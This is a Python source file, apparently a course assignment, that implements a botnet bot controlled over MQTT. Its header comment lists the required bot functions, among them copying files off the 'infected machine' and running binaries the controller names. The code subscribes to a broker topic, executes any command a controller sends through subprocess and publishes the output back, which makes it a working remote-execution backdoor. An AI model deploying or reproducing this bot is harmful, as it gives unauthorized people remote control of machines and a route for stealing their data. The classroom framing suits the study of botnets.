# 5. Minimal required functionality of the bots:
#   1. announcing the presence of the bot to the controller if asked.
#   2. listing users currently logged in the "infected" device (output of 'w' command).
#   3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
#   4. id of the user running the bot (output of 'id command').
#   5. copying of a file from the "infected machine" to the controller (file path is a parameter specified by the controller).
#   6. executing a binary inside the "infected machine" specified by the controller (e.g. '/usr/bin/ps').
import subprocess
import paho.mqtt.client as mqtt
from consts import *


# broker = central server that receives all messages
#          and then routes them to the correct destinations.



def on_message(client, userdata, msg):
    payload = msg.payload.decode()
    if payload.startswith(BOT_ID + ":"):
        full_command = payload.split(":", 1)[1] # e.g., "ls /home"

        # Split into command and arguments
        parts = full_command.split(" ", 1)
        action = parts[0] # e.g., "ls"
        argument = parts[1] if len(parts) > 1 else "" # e.g., "/home"

        print(f"Action: {action} | Argument: {argument}")

        result = ""
        try :
            if action == "ls":
                # If argument is empty, just use ['ls'], otherwise ['ls', argument]
                cmd_list = ["ls", argument] if argument else ["ls"]
                # capture_output would be modern, but check_output is fine
                # we add stderr=subprocess.STDOUT so we see errors in the controller
                result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()
            else:
                # For other commands, execute them directly and IGNORE blank "" args
                cmd_list = [action] + ([argument] if argument else [])
                result = subprocess.check_output(cmd_list, stderr=subprocess.STDOUT).decode()

            if(result == ""):
                return f"{action} command executed"
            client.publish(TOPIC, f"{BOT_ID}_RES: {result}")
        except Exception as e:
            error_message = str(e)
            client.publish(TOPIC, f"{BOT_ID}_ERR: {error_message}")



    else:
        # It's someone else's traffic. Ignore it.
        pass


# both the bot and the controller are 'clients'
# client = mqtt.Client()
# added version to avoid warning
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)


# callback when a message is received
client.on_message = on_message
client.connect(BROKER, PORT)
client.subscribe(TOPIC)

print("Subscribed! Waiting for commands...")

# prevents the script from ending.
client.loop_forever()

